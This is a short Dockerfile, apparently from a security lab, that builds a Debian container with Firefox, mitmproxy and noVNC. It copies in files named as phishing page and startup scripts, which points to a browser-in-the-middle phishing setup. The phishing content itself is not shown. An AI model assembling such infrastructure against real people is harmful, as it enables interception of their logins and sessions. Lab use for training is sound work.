FROM debian:bullseye-slim
LABEL maintainer="admin@csalab.id"
WORKDIR /root
RUN apt update && \
apt -y upgrade && \
DEBIAN_FRONTEND=noninteractive apt -yq install \
  openbox \
  firefox-esr \
  mitmproxy \
  curl \
  novnc \
  net-tools \
  tigervnc-standalone-server \
  tigervnc-xorg-extension \
  tigervnc-viewer && \
apt -y full-upgrade && \
apt -y autoremove && \
apt clean all
COPY script/phising.index.html /usr/share/novnc/index.html
COPY script/phising.startup.sh /startup.sh
ENTRYPOINT [ "/bin/bash", "/startup.sh" ]